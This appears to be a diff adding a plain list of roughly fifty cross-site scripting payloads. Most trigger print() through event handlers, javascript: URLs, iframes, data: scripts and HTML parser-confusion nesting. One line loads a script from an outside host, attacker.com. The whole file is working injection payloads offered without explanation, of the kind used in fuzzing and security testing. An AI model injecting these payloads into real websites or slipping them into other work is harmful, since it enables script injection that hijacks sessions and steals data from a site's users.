@@ -1,0 +1,50 @@
+<svg/onload=print()>
+<img src=x onerror=print()>
+<body onload=print()>
+<input onfocus=print() autofocus>
+<marquee onstart=print()>
+<details open ontoggle=print()>
+<video src=x onerror=print()>
+<audio src=x onerror=print()>
+<body onpageshow=print()>
+<body onresize=print()>
+<input onmouseover=print()>
+<svg><animate onbegin=print() attributeName=x>
+<svg><set onbegin=print() attributename=x>
+<math><annotation-xml encoding="text/html"><svg onload=print()></svg></annotation-xml></math>
+<xss onpointerrawupdate=print()>test</xss>
+<xss ontransitionrun=print()>
+<xss ontransitionstart=print()>
+<xss ontransitionend=print()>
+<xss onanimationstart=print()>
+<xss onanimationend=print()>
+<xss onanimationiteration=print()>
+<div onpointerover=print()>MOVE HERE</div>
+<div onpointerenter=print()>MOVE HERE</div>
+<div onpointerdown=print()>CLICK HERE</div>
+<div onpointerup=print()>CLICK HERE</div>
+<div onauxclick=print()>RIGHT CLICK HERE</div>
+<div oncontextmenu=print()>RIGHT CLICK HERE</div>
+<xss ongotpointercapture=print()>test</xss>
+<xss onlostpointercapture=print()>test</xss>
+<div contenteditable onbeforeinput=print()>test</div>
+<div contenteditable oninput=print()>test</div>
+<dialog open onclose=print()>test</dialog>
+<form><button formaction=javascript:print()>X</button>
+<a href="javascript:print()">X</a>
+<a href="javascript:void(0)" onclick=print()>X</a>
+<svg><a><rect width=100 height=100 /><animate attributeName=href values=javascript:print()>
+<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>click</a>
+<script>print()</script>
+"><script>print()</script>
+'><script>print()</script>
+</script><script>print()</script>
+<script src="data:text/javascript,print()"></script>
+<script src="https://attacker.com/xss.js"></script>
+<iframe srcdoc="<script>print()</script>">
+<iframe src="javascript:print()">
+<object data="javascript:print()">
+<embed src="javascript:print()">
+<svg><script>print()</script></svg>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=print()>
+<noscript><img src=x onerror=print()></noscript>
